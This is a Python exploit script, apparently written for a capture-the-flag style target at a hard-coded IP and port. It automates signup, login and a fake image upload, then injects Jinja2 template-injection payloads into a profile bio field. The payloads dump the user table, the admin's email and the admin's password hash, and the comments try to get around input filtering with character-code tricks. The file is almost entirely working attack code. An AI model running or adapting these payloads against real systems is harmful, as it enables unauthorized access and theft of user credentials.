#!/usr/bin/env python3
import requests
from PIL import Image
import io
import re
import random

BASE_URL = "http://94.237.56.175:48466"

def exploit(payload, desc=""):
    session = requests.Session()
    u = f"a{random.randint(100000,999999)}"
    
    session.post(f"{BASE_URL}/signup", data={'email': f'{u}@t.com', 'username': u, 'password': 'p'})
    session.post(f"{BASE_URL}/login", data={'username': u, 'password': 'p'})
    
    img = Image.new('RGB', (50, 50))
    buf = io.BytesIO()
    img.save(buf, 'JPEG')
    buf.seek(0)
    session.post(f"{BASE_URL}/verification", files={'file': ('x.jpg', buf, 'image/jpeg')})
    
    r = session.post(f"{BASE_URL}/profile", data={'bio': payload})
    if "Bio updated" not in r.text:
        print(f"✗ BLOCKED: {desc}")
        return None
    
    session.get(f"{BASE_URL}/getlink")
    r = session.get(f"{BASE_URL}/user/{u}")
    
    if r.status_code != 200:
        print(f"✗ ERROR {r.status_code}: {desc}")
        return None
    
    m = re.search(r'<p class="para-class">(.*?)</p>', r.text, re.DOTALL)
    result = m.group(1).strip() if m else ""
    print(f"✓ OK: {desc} -> {result[:100]}")
    return result

print("[*] Building strings character by character...\n")

# Use Jinja2 ~ operator to concatenate individual characters
# 'g'~'l'~'o'~'b'~'a'~'l'~'s' = 'globals'

# But wait, maybe we don't need __globals__!
# Let me think of alternative approaches...

# What if we use the fact that User is a SQLAlchemy model?
# SQLAlchemy models have access to the database engine, which might give us file access

print("Test 1: Exploring User model capabilities")
tests = [
    ("User query all", "{{ User.query.all() }}"),
    ("User metadata tables", "{{ User.metadata.tables }}"),
    ("Get admin user", "{{ User.query.first() }}"),
    ("Admin email", "{{ User.query.first().email }}"),
]

for desc, payload in tests:
    exploit(payload, desc)

# Actually, I wonder if we can use the admin credentials to login and verify ourselves!

print("\n\nTest 2: Try to get admin credentials")
admin_tests = [
    ("Admin password hash", "{{ User.query.first().password }}"),
    ("All users", "{{ User.query.all()|length }}"),
]

for desc, payload in admin_tests:
    exploit(payload, desc)

# Let's think differently - what if we use character codes?
print("\n\nTest 3: Using character codes")
chr_tests = [
    ("Using chr", "{{ (97)|chr }}"),  # 'a'
    ("Using format", "{{ '%c'|format(97) }}"),
]

for desc, payload in chr_tests:
    exploit(payload, desc)
